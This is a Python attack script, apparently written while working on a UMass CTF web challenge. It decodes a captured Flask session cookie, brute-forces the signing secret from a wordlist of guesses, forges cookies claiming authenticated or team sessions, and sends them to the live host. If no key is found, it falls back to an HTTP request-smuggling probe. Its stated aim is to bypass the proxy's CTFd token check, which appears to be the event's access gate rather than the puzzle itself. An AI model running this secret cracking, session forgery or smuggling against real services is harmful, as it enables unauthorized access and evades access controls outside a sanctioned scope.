"""
Try to crack the Flask session cookie secret and forge an authenticated session.
The proxy uses Flask sessions (itsdangerous). If we can find the secret key,
we can forge a session cookie that bypasses the CTFd token check.
"""
import base64
import hashlib
import hmac
import json
import struct
import time
import zlib
import requests
import re

# The session cookie from the proxy
COOKIE = "eyJjc3JmX3Rva2VuIjoiMWMzNjBmNGNiN2MyYzVmNjlmZDRjNmQ5YWIzNmFhYTc4YmRjOTlmNiJ9.advjrQ.niuJKUnrXC-uoZIfbV9n37NU5vk"

BASE = "http://blockcitytimes.web.ctf.umasscybersec.org:5000"

def decode_flask_payload(cookie):
    """Decode the payload part of a Flask session cookie."""
    payload = cookie.split('.')[0]
    # Add padding
    padding = 4 - len(payload) % 4
    if padding != 4:
        payload += '=' * padding
    try:
        data = base64.urlsafe_b64decode(payload)
        # Try decompressing (Flask compresses if shorter)
        if data[0:1] == b'.':
            data = zlib.decompress(data[1:])
        return json.loads(data)
    except:
        return None

print("[*] Decoded session payload:")
payload = decode_flask_payload(COOKIE)
print(f"    {payload}")

# Flask uses itsdangerous URLSafeTimedSerializer
# The signing uses HMAC-SHA1 with the secret key derived via:
# key = hmac.new(secret_key, "cookie-session", sha1).digest()

def flask_sign(data_dict, secret_key, salt='cookie-session'):
    """Sign a Flask session cookie with the given secret key."""
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import SecureCookieSessionInterface
    
    # Create serializer matching Flask's default
    s = URLSafeTimedSerializer(
        secret_key,
        salt=salt,
        serializer=None,  
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }
    )
    return s.dumps(data_dict)

def try_unsign(cookie, secret_key):
    """Try to verify a Flask session cookie with the given secret key."""
    try:
        from itsdangerous import URLSafeTimedSerializer
        s = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            signer_kwargs={
                'key_derivation': 'hmac',
                'digest_method': hashlib.sha1
            }
        )
        data = s.loads(cookie, max_age=None)
        return True, data
    except:
        return False, None

# Common Flask secret keys to try
common_secrets = [
    "secret", "secret-key", "super-secret", "supersecret", "flask-secret",
    "change-me", "changeme", "password", "admin", "test", "dev", "development",
    "production", "key", "SECRET_KEY", "secret_key", "mysecret", "my-secret",
    "s3cr3t", "s3cret", "keyboard cat", "flask", "app-secret", "app_secret",
    "default", "please-change-me", "insecure", "CHANGE_ME", "your-secret-key",
    "block-city-times", "blockcitytimes", "BlockCityTimes", "BLOCK_CITY_TIMES",
    "the-block-city-times", "theblockcitytimes", "umass", "umasscybersec",
    "umassctf", "ctf", "CTF", "flag", "FLAG", "UMASS", "UMassCTF",
    "newspaper", "editorial", "news", "block", "city", "times",
    "blockworld", "block-world", "changed_on_remote",
    "supersecretkey", "super_secret_key", "my_secret_key",
    "asdf", "qwerty", "1234", "12345", "123456", "abcdef",
    "hunter2", "p@ssw0rd", "letmein", "welcome",
    "sk-secret", "jwt-secret", "token-secret",
    "ThisIsASecretKey", "this_is_a_secret_key",
    "sUpEr_sEcReT", "not-so-secret", "placeholder",
    "debug", "DEBUG", "flask-debug", "devkey", "dev-key",
    "key123", "secret123", "pass123", "test123",
    "session-secret", "cookie-secret",
    "UMASS{", "UMASS{flag}", "UMASS{test}",
    "MrLarryMan", "Larry",
    # Common from CTFs
    "sk3y", "fl@sk", "s3ss10n", 
    "", " ",
]

print(f"\n[*] Trying {len(common_secrets)} common secret keys...")
found_secret = None

for secret in common_secrets:
    success, data = try_unsign(COOKIE, secret)
    if success:
        print(f"\n[+] SECRET KEY FOUND: '{secret}'")
        print(f"    Decoded data: {data}")
        found_secret = secret
        break

if not found_secret:
    # Try with a wordlist approach - common passwords
    print("[-] No common secret matched. Trying extended wordlist...")
    
    # Try some more patterns
    for prefix in ["", "UMASS_", "umass_", "ctf_", "flask_", "block_", "bct_"]:
        for suffix in ["", "123", "!", "_key", "_secret", "2024", "2025", "2026"]:
            for base in ["secret", "admin", "key", "password", "flag", "ctf", "news", "times"]:
                secret = prefix + base + suffix
                success, data = try_unsign(COOKIE, secret)
                if success:
                    print(f"\n[+] SECRET KEY FOUND: '{secret}'")
                    print(f"    Decoded data: {data}")
                    found_secret = secret
                    break
            if found_secret:
                break
        if found_secret:
            break

if found_secret:
    print("\n[*] Forging authenticated session cookie...")
    # Try various authenticated payloads
    for auth_payload in [
        {"csrf_token": payload.get("csrf_token", ""), "authenticated": True},
        {"csrf_token": payload.get("csrf_token", ""), "auth": True},
        {"csrf_token": payload.get("csrf_token", ""), "valid": True},
        {"csrf_token": payload.get("csrf_token", ""), "team_id": 1},
        {"csrf_token": payload.get("csrf_token", ""), "authenticated": True, "team_id": 1},
    ]:
        forged = flask_sign(auth_payload, found_secret)
        print(f"\n  Trying payload: {auth_payload}")
        print(f"  Forged cookie: {forged}")
        
        s = requests.Session()
        s.cookies.set("session", forged, domain="blockcitytimes.web.ctf.umasscybersec.org")
        r = s.get(f"{BASE}/submit", timeout=10, allow_redirects=True)
        
        if "Authenticate" not in r.text and "access token" not in r.text:
            print(f"  [+] BYPASS SUCCESSFUL! Got {r.status_code}, content length: {len(r.text)}")
            print(f"  Response: {r.text[:500]}")
            break
        else:
            print(f"  [-] Still on auth page")
else:
    print("\n[-] Could not crack the Flask secret key with common passwords.")
    print("[*] The proxy validates tokens against the CTFd API.")
    print("[*] Let me try some other bypass techniques...")
    
    # Try request smuggling / HTTP desync
    print("\n[*] Testing for request smuggling...")
    import http.client
    
    # Try direct connection with raw HTTP
    conn = http.client.HTTPConnection("blockcitytimes.web.ctf.umasscybersec.org", 5000, timeout=10)
    
    # Try Transfer-Encoding: chunked with Content-Length mismatch
    try:
        conn.request("GET", "/submit", headers={
            "Host": "blockcitytimes.web.ctf.umasscybersec.org:5000",
            "Transfer-Encoding": "chunked",
            "Content-Length": "0"
        })
        resp = conn.getresponse()
        body = resp.read().decode('utf-8', errors='replace')
        print(f"  CL-TE: {resp.status} | {'Authenticate' in body}")
        if 'Authenticate' not in body and resp.status == 200:
            print(f"  [+] SMUGGLING BYPASS: {body[:500]}")
    except Exception as e:
        print(f"  CL-TE error: {e}")
    
    conn.close()

print("\n[*] Done")
